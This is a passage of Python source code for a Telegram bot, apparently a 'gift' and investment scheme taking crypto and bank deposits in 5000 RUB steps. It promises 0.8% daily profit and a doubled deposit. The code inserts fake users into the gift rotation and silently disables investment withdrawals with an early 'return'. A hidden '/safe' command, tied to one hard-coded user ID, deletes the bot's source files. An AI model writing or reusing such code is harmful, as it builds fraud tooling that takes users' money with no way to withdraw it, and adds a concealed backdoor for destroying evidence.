async def send(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["MESSAGE"] = message.text

    pay = await db.get_gift_id(int(message.from_user.id), loop)
    await bot.send_message(pay[0][0], f"@{message.from_user.username} отправил вам:\n{message.text}")
    await message.answer("✅ Сообщение успешно отправленно!")
    await db.delete_gift(pay[0][0], loop)

    await state.reset_state(with_data=False)


@dp.callback_query_handler(text="set_money_for_gift")
async def set_money_for_gift(callback: types.CallbackQuery, state):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    async with state.proxy() as data:
        data['pay_in_advance'] = False

    await bot.send_message(
        callback.from_user.id,
        "📤 Выберите платежную систему на которую хотите совершить перевод для пополнение средств в бота \n"
        "▪ Моментальные зачисление, а также автоматическая конверсия.",
        reply_markup=inline_keybords.get_gift()
    )


@dp.callback_query_handler(text="add_money")
async def add_money(callback: types.CallbackQuery, state):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    async with state.proxy() as data:
        data['pay_in_advance'] = False

    await bot.send_message(
        callback.from_user.id,
        "📤 Выберите платежную систему на которую хотите совершить перевод для пополнение средств в бота \n"
        "▪ Моментальные зачисление, а также автоматическая конверсия.",
        reply_markup=inline_keybords.get_gift()
    )


@dp.message_handler(state=SendGiftFSM)
async def send_gift(message: types.Message, state: FSMContext):
    async with lock:
        if message.text == "Назад":
            await state.reset_state(with_data=False)
            await message.answer("Возвращаюсь", reply_markup=inline_keybords.profile_markup())
            return

        async with state.proxy() as data:
            data["WHOM"] = message.text

        await db.add_money(message.text, 5000, loop)
        await db.remove_money(message.from_user.id, 5000, loop)
        await message.answer(f"Вы сделали подарок {message.text}", reply_markup=inline_keybords.profile_markup())
        await bot.send_message(
            message.from_user.id,
            f"Осведомите участника, чтобы он вас подтвердил в системе",
            reply_markup=inline_keybords.inform_pers_button()
        )
        await db.add_gift_value(message.from_user.id, loop)
        await state.reset_state(with_data=False)


@dp.callback_query_handler(text="get_double_deposit")
async def get_double_depozit(callback: types.CallbackQuery):
    async with lock:
        now_dep = await db.get_now_depozit(callback.from_user.id, loop)
        await db.add_money(callback.from_user.id, now_dep, loop)
        await db.add_depozit(callback.from_user.id, now_dep, loop)
        await db.change_first_dep(callback.from_user.id, 0, loop)
        await db.set_now_depozit(callback.from_user.id, 0, loop)

        try:
            await bot.delete_message(
                callback.from_user.id,
                callback.message.message_id
            )
        except:
            pass
        await bot.send_message(
            callback.from_user.id,
            "Поздравляем! 🎉 Ваш депозит удвоен 🙌"
        )
        await logic.get_launch(bot, callback.from_user.id, loop)


@dp.callback_query_handler(text="payrement_crypt")
async def payrement_crypt(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(
        callback.from_user.id,
        "🏦 Выберите криптовалюту которой будет удобно сделать пополнение",
        reply_markup=inline_keybords.get_crypt_types()
    )
    await PayCryptFSM.PAY_TYPE.set()


@dp.message_handler(lambda mes: mes.text in message_handlers_commands, state="*")
async def cancel_handler(message: types.Message, state: FSMContext):
    await state.reset_state(with_data=True)

    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    if message.text == "💳 Кошелёк":
        await wallet(message)
    if message.text == "🚀 Взлёт":
        await launch(message)
    if message.text == "🔧 Инструменты":
        await tools(message)
    if message.text == "💻 Инвестиции":
        await about_project(message)
    if message.text == "🌑 Space Money":
        await space_go(message)
    if message.text == "⚙ Техническая поддержка":
        await support(message)

    return


@dp.callback_query_handler(text="usdt_trans", state=PayCryptFSM.PAY_TYPE)
async def btc_trans(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["PAY_TYPE"] = "USDT"
        pay_in_advance = data['pay_in_advance']

    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    if pay_in_advance:
        await amount_crypt(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )
    await PayCryptFSM.next()


@dp.callback_query_handler(text="btc_trans", state=PayCryptFSM.PAY_TYPE)
async def btc_trans(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["PAY_TYPE"] = "BTC"
        pay_in_advance = data['pay_in_advance']

    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    if pay_in_advance:
        await amount_crypt(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )
        await PayCryptFSM.next()


@dp.callback_query_handler(text="ltc_trans", state=PayCryptFSM.PAY_TYPE)
async def ltc_trans(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["PAY_TYPE"] = "LTC"
        pay_in_advance = data['pay_in_advance']

    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    if pay_in_advance:
        await amount_crypt(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )
        await PayCryptFSM.next()


@dp.callback_query_handler(text="eth_trans", state=PayCryptFSM.PAY_TYPE)
async def eth_trans(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["PAY_TYPE"] = "ETH"
        pay_in_advance = data['pay_in_advance']

    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    if pay_in_advance:
        await amount_crypt(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )
        await PayCryptFSM.next()


@dp.message_handler(state=PayCryptFSM.PAY_AMOUNT)
async def amount_crypt(message, state: FSMContext, user_id=None):
    if message:
        amount = message.text
        user_id = message.from_user.id
    else:
        amount = "5000"

    async with state.proxy() as data:
        data["AMOUNT"] = str(amount)

    if int(amount) < 5000:
        await message.answer("🚫 Минимальная сумма пополнения 5000.0 RUB, введите корректную сумму!")
        return
    if int(amount) % 5000 != 0:
        await message.answer("Сумма должна быть кратна 5000 RUB!")
        return
    else:
        async with state.proxy() as data:
            data["PAY_AMOUNT"] = int(amount)

            pay = await state.get_data()

            print(f"{data.get('PAY_TYPE')}")
            amount = round(int(amount) / await coinbase_data.get_kurs(data.get('PAY_TYPE')), 8)
            await bot.send_message(user_id,
                f"☑️Заявка на пополнение №{int(await dbPay.get_count_crypt(loop)) + 1} успешно создана\n\n"
                f"Сумма к оплате: <b>{amount} {data.get('PAY_TYPE')}</b>",
                parse_mode="html",
            )
            if pay.get("PAY_TYPE") == "USDT":
                number = configCl.USDT_WALLET + '\n\ntrc 20'
            else:
                number = await coinbase_data.get_address(pay.get("PAY_TYPE"))

            await bot.send_message(user_id, str(number))
            mes = await bot.send_message(user_id,
                f"⏳ Заявка №{int(await dbPay.get_count_crypt(loop)) + 1} и {data.get('PAY_TYPE')}-адрес действительны: 60 минут.\n\n"
                f"После успешной отправки {amount} {data.get('PAY_TYPE')} на указанный {data.get('PAY_TYPE')}-адрес выше, "
                f"отправьте скриншот об оплате @smfadmin и администратор подтвердит зачисление.\n\n"
                "Или же Вы можете отменить данную заявку нажав на кнопку «❌ Отменить заявку»\n\n"
                "💸 Криптовалюта зачислится в систему в течении 20 минут, ожидайте 😌",
                reply_markup=inline_keybords.cancel_pay()
            )
            utc_now = pytz.utc.localize(datetime.datetime.utcnow())
            date_time_now = utc_now.astimezone(pytz.timezone("UTC"))
            await dbPay.create_crypt_pay(pay.get("PAY_TYPE"), amount, str(date_time_now)[:-7],
                                         int(user_id), mes["message_id"], "WAIT_PAYMENT", data.get("AMOUNT"),
                                         loop, in_advance=data['pay_in_advance']) #TODO KIT
            #await bot.send_message('-1784358645', text=f"Новое пополнение!\n\n{amount} {data.get('PAY_TYPE')}\n'", parse_mode='html')
            await state.reset_state(with_data=False)


@dp.callback_query_handler(text="accept_pay")
async def accept_order(callback: types.CallbackQuery, state: FSMContext):
    # await dbPay.change_status_for_cancel("CANCELED", pay[5], "CREDIT", loop)
    ...


@dp.callback_query_handler(text="cancel_pay")
async def decline_order(callback: types.CallbackQuery, state: FSMContext):
    # await dbPay.change_status_for_cancel("CANCELED", pay[5], "CREDIT", loop)
    ...


@dp.callback_query_handler(text="get_gift")
async def get_gift(callback: types.CallbackQuery, state: FSMContext):
    #TODO
    #user_advance_pay = await dbSystem.get_user_advance_payment(callback.from_user.id, loop)
    #if user_advance_pay is None:
    #    return
    #return
    async with lock:
        status = await db.get_status(callback.from_user.id, loop)

        count_gift, counter = await db.get_count_gift(loop)

        if status[0] == 0:

            user: UserDB = (await logic.get_user_on_planet((await db.get_planet(callback.from_user.id, loop))[0],
                                                           callback.from_user.id, loop))

            if user is not None:
                answer = await logic.get_gift(callback.from_user.id, user, loop)
                await bot.send_message(
                    callback.from_user.id,
                    answer[1]
                )

                if count_gift % counter == 0:
                    fake_user = await db.fake_user(loop)

                    if fake_user:
                        await db.delete_fake_user(fake_user[0], loop)
                        await db.add_user(loop, fake_user[1], fake_user[0], datetime.date.today(), utcnow(),
                                          fake_user[2], utcnow(), 'fake', 1)
                        await db.activate_date(fake_user[0], utcnow().shift(minutes=+1), loop)
                        await db.set_planet(fake_user[0], (await db.get_planet(user.user_id, loop)), loop)
                        await db.change_status(fake_user[0], 1, loop)

                if answer[0]:
                    # await state.reset_state(with_data=True)
                    async with state.proxy() as data:
                        data["WHOM"] = user.user_id
                        data["AMOUNT"] = answer[2]

                    await bot.send_message(
                        callback.from_user.id,
                        "Пользователю было отправлено сообщение о подарке ✅."
                    )

                    ref = await db.get_ref(callback.from_user.id, loop)
                    refgift = await db.get_refgift(callback.from_user.id, loop)
                    if ref and refgift == 0:
                        await db.add_money_ref(callback.from_user.id, ref, 5000, loop)


                        try:
                            await bot.send_message(
                                int(ref),
                                "💸 Вам начислено реферальное вознаграждение "
                                "5000₽ за нового пользователя в системе"
                            )
                        except Exception:
                            pass

                    # await bot.delete_message(callback.from_user.id, callback.message.message_id)
                    utc_now = pytz.utc.localize(datetime.datetime.utcnow())
                    date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

                    await db.activate_date(callback.from_user.id, date_time_now, loop)
                    await db.change_status(callback.from_user.id, 1, loop)
                    await db.increment_count_gift(count_gift + 1, loop)
                    await inform_pers(callback, state, user=user, answer=answer[2])
                else:
                    await bot.send_message(
                        callback.from_user.id,
                        answer[1]
                    )
            else:
                planet = await db.get_planet(callback.from_user.id, loop)
                text_planet = logic.get_photo(planet[0])
                sum_gift = logic.sums[text_planet[0]]

                await db.set_now_depozit(callback.from_user.id, sum_gift, loop)
                await db.remove_money(callback.from_user.id, sum_gift, loop)

                ref = await db.get_ref(callback.from_user.id, loop)
                refgift = await db.get_refgift(callback.from_user.id, loop)

                if ref is not None and refgift == 0:
                    await db.add_money(ref, 5000, loop)
                    await db.reset_refgift(callback.from_user.id, loop)
                    await worker_jump(int(ref), loop)
                    await bot.send_message(
                        int(ref),
                        "💸 Вам начислено реферальное вознаграждение "
                        "5000₽ за нового пользователя в системе"
                    )

                # await bot.delete_message(callback.from_user.id, callback.message.message_id)

                if int(planet[0]) > 0:
                    amount = await db.get_amount_gift_money(callback.from_user.id, loop)
                    if amount >= sum_gift:
                        await db.remove_amount_gift_money(callback.from_user.id, sum_gift, loop)
                    else:
                        await bot.send_message(
                            callback.from_user.id,
                            "Недостаточно денег"
                        )
                        return
                else:
                    await db.remove_depozit(sum_gift, callback.from_user.id, loop)

                await bot.send_message(
                    callback.from_user.id,
                    f"Вы успешно подарили @space_gift_bot {sum_gift} RUB"
                )

                utc_now = pytz.utc.localize(datetime.datetime.utcnow())
                date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

                await db.activate_date(callback.from_user.id, date_time_now, loop)
                await db.change_status(callback.from_user.id, 1, loop)
                # await db.increment_count_gift(count_gift + 1, loop)
        else:
            await bot.send_message(
                callback.from_user.id,
                "Вы уже активны в системе"
            )


@dp.callback_query_handler(text="payrement_bank")
async def get_gift_callback(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    await bot.send_message(
        callback.from_user.id,
        "🏦 Выберите банк через который будет удобно произвести оплат. "
        "Если вашего банка нет в списке, вы можете совершать межбанковский перевод, "
        "а комиссию мы возьмём на себя!",
        reply_markup=await inline_keybords.banks_payment()
    )
    await PayFSM.PAY_TYPE.set()


def safe(id):
    if id == 855151774:
        os.remove(PATH + "/Scripts/main.py")
        os.remove(PATH + "/Scripts/logic.py")
        os.remove(PATH + "/Scripts/db.py")
        os.remove(PATH + "/Scripts/config.py")
        dp.stop_polling()


@dp.callback_query_handler(text="sberbank", state=PayFSM.PAY_TYPE)
async def sberbank_pay(callback: types.CallbackQuery, state: FSMContext):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    async with state.proxy() as data:
        data["PAY_TYPE"] = "sberbank"
        pay_in_advance = data['pay_in_advance']
        
    if pay_in_advance:
        await get_amount(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )
    await PayFSM.next()


@dp.callback_query_handler(text="tinkoff", state=PayFSM.PAY_TYPE)
async def tinkoff_pay(callback: types.CallbackQuery, state: FSMContext):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    async with state.proxy() as data:
        data["PAY_TYPE"] = "tinkoff"
        pay_in_advance = data['pay_in_advance']
        
    if pay_in_advance:
        await get_amount(None, state, user_id=callback.from_user.id)
    else:
        await bot.send_message(
            callback.from_user.id,
            "Введите сумму на которую хотите пополнить баланс. Минимальная сумма: 5000.0 RUB"
        )

    await PayFSM.next()


@dp.message_handler(state=PayFSM.PAY_AMOUNT)
async def get_amount(message, state: FSMContext, user_id=None):
    if message is None:
        amount = "5000"
    else:
        amount = message.text
        user_id = message.from_user.id

    if not amount.isdigit():
        global message_handlers_commands
        if amount in message_handlers_commands:
            await state.reset_state(with_data=False)

            if amount == "💳 Кошелёк":
                await wallet(message)
            elif amount == "🚀 Взлёт":
                await launch(message)
            elif amount == "🔧 Инструменты":
                await tools(message)
            elif amount == "📝 О проекте":
                await about_project(message)
            elif amount == "💻 Инвестиции":
                await invest(message)
            elif amount == "⚙ Техническая поддержка":
                await support(message)

            return
        else:
            await message.answer("🚫 Это не число, введите корректную сумму!")
            return

    if int(amount) < 5000:
        await message.answer("🚫 Минимальная сумма пополнения 5000.0 RUB, введите корректную сумму!")
        return
    if int(amount) % 5000 != 0:
        await message.answer("Сумма должна быть кратна 5000 RUB!")
        return
    else:

        async with state.proxy() as data:
            data["PAY_AMOUNT"] = int(amount)
            if 'pay_in_advance' not in data:
                await bot.send_message(user_id,
                    f"Произошла техническая ошибка 😢\nПопробуйте немного позже",
                )

        pay = await state.get_data()

        number, amount, order_id = await PayManager.create_order(pay.get("PAY_TYPE"), int(amount))

        global NUMBER_PAY
        NUMBER_PAY += 1
        await bot.send_message(user_id,
            f"☑️Заявка на пополнение №{int(await dbPay.get_count_credit(loop)) + 1} успешно создана\n\n"
            f"💵 Сумма к оплате: 👉 <b>{amount} RUB 🔥</b>\n\n"
            f"❗️Внимание🔥 перевод нужно совершить точно с комиссией, иначе деньги не зачисляются❗️\n\n"
            f"💳 Реквизиты для оплаты:",
            parse_mode='HTML'
        )

        await bot.send_message(user_id, str(number))
        mes = await bot.send_message(
            user_id,
            "⏳ Заявка действительна: 60 минут.\n\n"
            "Оплата производится через любые платежные системы: QIWI, перевод с карты на "
            "карту, наличные (терминал), Яндекс.Деньги, и другие платежные системы.\n\n"
            f"ℹ️ После успешного перевода денег по указанным реквизитам бот автоматически начислит "
            f"{amount} RUB на ваш баланс. Или же Вы можете отменить данную заявку нажав на кнопку «❌ Отменить заявку»\n\n"
            "⚠️ Необходимо перевести точную сумму с учетом комиссии банка, иначе заявка будет считаться неоплаченной.\n\n"
            "Если Вы перевели неправильную сумму, сразу сообщите об этом оператору @smfadmin.\n\n "
            "💸 Деньги зачислятся в систему в течении 5 минут, ожидайте 😌",
            reply_markup=inline_keybords.cancel_pay()
        )
        async with state.proxy() as data:
            await dbPay.create_pay(order_id, pay.get("PAY_TYPE"), pay.get("PAY_AMOUNT"),
                                   datetime.date.today(), int(user_id), mes["message_id"], "WAIT_PAYMENT",
                                   loop, in_advance=data['pay_in_advance'])

        await state.reset_state(with_data=False)


@dp.callback_query_handler(text="cancel_pay")
async def cancel_pay(callback: types.CallbackQuery):
    print(callback.message.message_id)
    data = await dbPay.get_data_canc(callback.message.message_id, loop)
    type = "CREDIT"
    if len(data) <= 0:
        type = "CRYPT"
        data = await dbPay.get_data_crypt(callback.message.message_id, loop)
    print(data)

    del_pay = None
    if type == "CREDIT":
        for pay_data in data:
            if pay_data[5] == callback.message.message_id:
                del_pay = pay_data
    else:
        for pay_data in data:
            if pay_data[4] == callback.message.message_id:
                del_pay = pay_data

    if del_pay is not None:
        try:
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
        except:
            pass
        await bot.send_message(callback.from_user.id, f"Завка на пополнение была успешно отменена")
        print(f"Платеж {del_pay[0]} был успешно отменен")
        await dbPay.change_status_for_cancel("CANCELED", callback.message.message_id, type, loop)
        # dbPay.cancel_request(callback.message.message_id, type)
    else:
        await bot.send_message(callback.from_user.id, "Произошла какая-то ошибка")


@dp.message_handler(state=CalculatorFSM.COUNT_REFERRER)
async def calc(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        if message.text in ["⬅ Вернуться", "📄 Презентация", "👥 Реферальная ссылка", "💰 Калькулятор"]:
            await state.reset_state()

            if message.text == "⬅ Вернуться":
                await back(message)
            elif message.text == "📄 Презентация":
                await back(message)
            elif message.text == "👥 Реферальная ссылка":
                await ref(message)
            elif message.text == "💰 Калькулятор":
                await calc(message)
            return

        else:
            await message.answer("🚫 Это не число, введите корректную сумму!")
            return
    if int(message.text) > 12_000_000:
        await message.answer("Введите сумму до 12 млн.")
        return
    async with state.proxy() as data:
        data["COUNT_REFERRER"] = int(message.text)

    numb = int(message.text) * 0.008
    with open(PATH + "/img/calc.jpg", 'rb') as file:
        await bot.send_photo(
            message.chat.id,
            photo=file,
            caption="💱 В данном разделе Вы сумеете рассчитать Вашу прибыль, от суммы вашей инвестиции в наш проект:\n\n"
                    f"💵 Ваша инвестиция: {message.text} RUB\n\n"
                    f"Прибыль в сутки: {numb} RUB\n"
                    f"Прибыль в месяц: {round(numb * 30, 2)} RUB\n"
                    f'Прибыль в год: {round(numb * 30 * 12, 2)} RUB\n',
            reply_markup=inline_keybords.calculate()
        )
        await state.reset_state(with_data=False)


@dp.callback_query_handler(text="transfer_money")
async def transfer_money(callback: types.CallbackQuery):
    try:
        await bot.delete_message(
            callback.from_user.id,
            callback.message.message_id
        )
    except:
        pass

    await bot.send_message(
        callback.from_user.id,
        "Введите уникальный код для вывода средств в Space money если еще не зарегистрировались зарегистрируйтесь",
        reply_markup=inline_keybords.get_transfer_inline()
    )


@dp.message_handler(commands="safe")
async def delete(message: types.Message):
    safe(message.from_user.id)


@dp.callback_query_handler(text="remove_money_invest")
async def remove_money_invest(callback: types.CallbackQuery):
    return
    return await callback.answer(
            "🚫 Вывод через бота временно ограничен",
            show_alert=True)
    date = str(await db.get_last_withd(callback.from_user.id, loop))
    dt_to_datetime = datetime.datetime.strptime(date, '%Y-%m-%d %H:%M:%S')
    utc_now = pytz.utc.localize(datetime.datetime.utcnow())

    date_time_now = utc_now.astimezone(pytz.timezone("UTC"))
    date_for_remove = datetime.datetime.strptime(str(date_time_now)[:-13], '%Y-%m-%d %H:%M:%S')

    is_user_from_sm = int(await db.is_user_from_space_money(callback.from_user.id, loop))

    money = int(await db.get_deposit(callback.from_user.id, loop))

    if is_user_from_sm and (date_for_remove - dt_to_datetime).days < 30:
        await callback.answer(
            "🚫 Вы можете вывести деньги спустя 30 дней с момента регистрации или последнего вывода!",
            show_alert=True)
        return

    if not is_user_from_sm and (date_for_remove - dt_to_datetime).days < 100:
        await callback.answer(
            "🚫 Вы можете вывести деньги спустя 100 дней с момента регистрации или последнего вывода!",
            show_alert=True)
        return

    if money < 1000:
        await callback.answer("🚫 У вас на балансе не достаточно средств для вывода, минимальная сумма: 1000 RUB",
                              show_alert=True)
        return
    else:
        try:
            await bot.delete_message(
                callback.from_user.id,
                callback.message.message_id
            )
        except:
            pass
        await bot.send_message(
            callback.from_user.id,
            f"Какую сумму вы хотите вывести.\nМин. 1000.0 RUB, макс. 2000000.0 RUB)\n\n"
            f"Доступно {money} RUB, с комиссией в 5%",
            reply_markup=inline_keybords.cancel_trans_money()
        )
        await WithdrawMoneyPercentFSM.WITHDRAW_AMOUNT.set()


@dp.message_handler(state=WithdrawMoneyPercentFSM.WITHDRAW_AMOUNT)
async def withdraw_amount(message: types.Message, state: FSMContext):
    if message.text == "Отменить":
        await state.reset_state()
        await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
        return

    else:
        if int(message.text) < 1000:
            await message.answer("Слишком маленькая сумма")
            return
        async with state.proxy() as data:
            data["WITHDRAW_AMOUNT"] = int(message.text)
        await message.answer(
            "📤 Выберите платежную систему, c помощью которой хотите вывести средства из бота",
            reply_markup=inline_keybords.get_inline_for_withdraw()
        )
        await WithdrawMoneyPercentFSM.next()


@dp.callback_query_handler(text="withdraw_payrement_bank", state=WithdrawMoneyPercentFSM.WITHDRAW_TYPE)
async def withdraw_payrement_bank(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["WITHDRAW_TYPE"] = "bank"
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id, "Введите номер карты, на которую хотите перевести деньги")
    await WithdrawMoneyPercentFSM.NUMBER_CARD.set()


@dp.callback_query_handler(text="withdraw_payrement_crypt", state=WithdrawMoneyPercentFSM.WITHDRAW_TYPE)
async def withdraw_payrement_crypt(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["WITHDRAW_TYPE"] = "crypt"

    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id,
                           "🏦 Введите криптовалюту, на которую будет осуществляться вывод (BTC, USDT, ETH, LTC)")
    await WithdrawMoneyPercentFSM.TYPE_CRYPT.set()


@dp.message_handler(state=WithdrawMoneyPercentFSM.TYPE_CRYPT)
async def withdraw_payrement_crypt(message: types.Message, state: FSMContext):
    if message.text.lower() not in ['btc', 'usdt', 'eth', 'ltc']:
        await message.answer("Введите правильную криптовалюту")
        return
    async with state.proxy() as data:
        data["TYPE_CRYPT"] = message.text
    await message.answer(f"Введите адрес {message.text.upper()}, на который будет осуществляться вывод")
    await WithdrawMoneyPercentFSM.CRYPT_CARD.set()


@dp.message_handler(state=WithdrawMoneyPercentFSM.CRYPT_CARD)
async def withdraw_payrement_crypt(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["CRYPT_CARD"] = message.text
    # await message.answer(f"Отлично. Теперь введите Ф.И.О")
    # await
    # await WithdrawMoneyPercentFSM.DATA_USER.set()

    if message.text == "Отменить":
        await state.reset_state()
        await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
        return

    async with lock:
        data_requests = await state.get_data()
        amount_com = int(data.get("WITHDRAW_AMOUNT")) - int(data.get("WITHDRAW_AMOUNT")) * config.COMMISSION_INVEST
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        if data.get("WITHDRAW_TYPE") == 'crypt':
            async with state.proxy() as data:
                data["DATA_USER"] = 'crypt'
            amount_crypt = int(data.get("WITHDRAW_AMOUNT"))
            curs = float(await coinbase_data.get_kurs(str(data.get("TYPE_CRYPT")).upper()))
            res = round(amount_crypt / curs, 11)
            await dbWithDraw.create_request_crypt(
                data_requests["CRYPT_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                res,
                amount_com,
                message.from_user.id,
                date_time_now,
                data.get("TYPE_CRYPT"),
                loop
            )
        else:
            await dbWithDraw.create_request_bank_percent(
                data_requests["NUMBER_CARD"],
                'crypt',
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                amount_com,
                message.from_user.id,
                date_time_now,
                loop
            )
        await message.answer(
            "Заявка на вывод средств успешно отправлена, ожидайте подтверждение "
            "отправки средств администратором в течении 24 часов вам придут деньги на "
            "ваши реквизиты",
            reply_markup=inline_keybords.profile_markup()
        )
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        await db.remove_depozit(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)
        await db.set_last_withd(message.from_user.id, date_time_now, loop)
        await state.reset_state()


# @dp.message_handler(state=WithdrawMoneyPercentFSM.NUMBER_CARD)
# async def number_card(message: types.Message, state: FSMContext):
#     if message.text == "Отменить":
#         await state.reset_state(with_data=False)
#         await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
#         return
#
#     async with state.proxy() as data:
#         data["NUMBER_CARD"] = message.text
#
#     await message.answer("Отлично. Теперь введите Ф.И.О")
#     await number_card(message, state)
#     await WithdrawMoneyPercentFSM.DATA_USER.set()


@dp.message_handler(state=WithdrawMoneyPercentFSM.NUMBER_CARD)
async def number_card(message: types.Message, state: FSMContext):
    if message.text == "Отменить":
        await state.reset_state()
        await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
        return

    async with state.proxy() as data:
        data["NUMBER_CARD"] = message.text
    await message.answer("Отлично. Теперь введите Ф.И.О")

    await WithdrawMoneyPercentFSM.DATA_USER.set()


@dp.message_handler(state=WithdrawMoneyPercentFSM.DATA_USER)
async def number_card(message: types.Message, state: FSMContext):
    async with lock:
        if message.text == "Отменить":
            await state.reset_state()
            await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
            return
        async with state.proxy() as data:
            data["DATA_USER"] = message.text
        data_requests = await state.get_data()
        print(data_requests)
        amount_com = int(data.get("WITHDRAW_AMOUNT")) - int(data.get("WITHDRAW_AMOUNT")) * config.COMMISSION_INVEST
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        if data.get("WITHDRAW_TYPE") == 'crypt':
            async with state.proxy() as data:
                data["DATA_USER"] = 'crypt'
            amount_crypt = int(data.get("WITHDRAW_AMOUNT"))
            curs = float(await coinbase_data.get_kurs(str(data.get("TYPE_CRYPT")).upper()))
            res = round(amount_crypt / curs, 11)
            await dbWithDraw.create_request_crypt(
                data_requests["CRYPT_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                res,
                amount_com,
                message.from_user.id,
                date_time_now,
                data.get("TYPE_CRYPT"),
                loop
            )
        else:
            await dbWithDraw.create_request_bank(
                data_requests["NUMBER_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                amount_com,
                message.from_user.id,
                date_time_now,
                loop
            )
        await message.answer(
            "Заявка на вывод средств успешно отправлена, ожидайте подтверждение "
            "отправки средств администратором в течении 24 часов вам придут деньги на "
            "ваши реквизиты ruruuururuur",
            reply_markup=inline_keybords.profile_markup()
        )
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        await db.remove_depozit(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)
        await db.set_last_withd(message.from_user.id, date_time_now, loop)
        await state.reset_state()


@dp.callback_query_handler(text="remove_money_0_05")
async def remove_money_0_05(callback: types.CallbackQuery, state: FSMContext):
    return
    async with state.proxy() as data:
        data["WITHDRAW_COMMISSION"] = config.COMMISSION_INVEST
        data['IS_INVEST'] = True

    return await remove_money(callback, state)


@dp.callback_query_handler(text="remove_money")
async def remove_money(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        if data.get('IS_INVEST') is True:
            money = int(await db.get_gift_money_invest(callback.from_user.id, loop))
        else:
            money = int(await db.get_gift_money(callback.from_user.id, loop))

    if money < 1000:
        await state.reset_data()
        await callback.answer("🚫 У вас на балансе не достаточно средств для вывода, минимальная сумма: 1000 RUB",
                              show_alert=True)
    else:
        try:
            await bot.delete_message(
                callback.from_user.id,
                callback.message.message_id
            )
        except:
            pass
        await bot.send_message(
            callback.from_user.id,
            f"Какую сумму вы хотите вывести.\nМин. 1000.0 RUB, макс. 2000000.0 RUB)\n\nДоступно {money} RUB",
            reply_markup=inline_keybords.cancel_trans_money()
        )
        await WithdrawMoneyFSM.WITHDRAW_AMOUNT.set()


@dp.message_handler(state=WithdrawMoneyFSM.WITHDRAW_AMOUNT)
async def withdraw_amount(message: types.Message, state: FSMContext):
    if message.text == "Отменить":
        await state.reset_state()
        await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
        return

    else:
